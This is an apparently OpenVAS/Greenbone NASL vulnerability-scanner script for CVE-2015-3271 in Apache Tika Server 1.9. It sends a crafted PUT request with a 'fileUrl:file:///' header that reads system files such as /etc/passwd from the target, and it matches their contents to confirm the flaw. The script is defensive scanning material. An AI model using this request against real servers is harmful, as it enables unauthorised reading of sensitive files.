CPE = "cpe:/a:apache:tika";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.810252" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2015-3271" );
	script_bugtraq_id( 9502 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-12-20 17:03:54 +0530 (Tue, 20 Dec 2016)" );
	script_name( "Apache Tika Server 'fileUrl' Header Information Disclosure Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with Apache Tika Server
  and is prone to an information disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted http PUT request
  and check whether it is able to read arbitrary file or not." );
	script_tag( name: "insight", value: "The flaw is due to it provides optional
  functionality to run itself as a web service to allow remote use. When used in
  this manner, it is possible for a 3rd party to pass a 'fileUrl' header to the
  Apache Tika Server (tika-server)." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read arbitrary files, this could be used to return sensitive content
  from the server machine." );
	script_tag( name: "affected", value: "Apache Tika Server 1.9" );
	script_tag( name: "solution", value: "Upgrade to Apache Tika Server 1.10 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2015/q3/350" );
	script_xref( name: "URL", value: "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-3271" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2015/08/13/5" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_tika_server_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "Apache/Tika/Server/Installed" );
	script_require_ports( "Services/www", 9998 );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!tikaPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: tikaPort )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/tika";
files = traversal_files();
useragent = http_get_user_agent();
host = http_host_name( port: tikaPort );
for file in keys( files ) {
	req = "PUT " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/plain\r\n" + "fileUrl:file:///" + files[file] + "\r\n\r\n";
	res = http_keepalive_send_recv( port: tikaPort, data: req );
	if(ContainsString( res, "; for 16-bit app support" ) || ContainsString( res, "[boot loader]" ) || IsMatchRegexp( res, "root:.*:0:" )){
		report = http_report_vuln_url( port: tikaPort, url: url );
		security_message( port: tikaPort, data: report );
		exit( 0 );
	}
}

